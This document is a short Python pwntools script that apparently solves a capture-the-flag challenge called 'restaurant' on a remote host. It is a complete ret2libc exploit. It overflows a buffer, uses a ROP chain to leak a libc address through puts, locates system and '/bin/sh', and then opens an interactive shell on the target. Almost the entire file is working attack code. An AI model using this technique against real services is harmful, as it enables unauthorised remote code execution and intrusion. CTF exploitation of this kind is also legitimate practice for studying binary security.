from pwn import *

address = '83.136.254.158'
port = 50397

context.log_level = 'critical'
context.binary = binary = ELF('./restaurant')
libc = ELF('./libc.so.6')
rop = ROP(binary)

ret = p64(rop.find_gadget(['ret'])[0])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

puts_plt = p64(binary.plt.puts)
puts_got = p64(binary.got.puts)

main = p64(binary.symbols.main)
overflow = b'A' * 40

payload = overflow
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main

with remote(address, port) as target:
	target.sendlineafter(b'> ', b'1')
	target.sendlineafter(b'> ', payload)
	target.recvuntil(overflow)

	puts_libc = u64(target.recvline().strip()[-6:].ljust(8, b'\x00'))
	libc.address = puts_libc - libc.symbols.puts

	bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
	system = p64(libc.symbols.system)

	payload = overflow
	payload += ret
	payload += pop_rdi
	payload += bin_sh
	payload += system

	target.sendlineafter(b'> ', b'1')
	target.sendlineafter(b'> ', payload)
	target.recvline()
	target.recv()

	target.interactive()
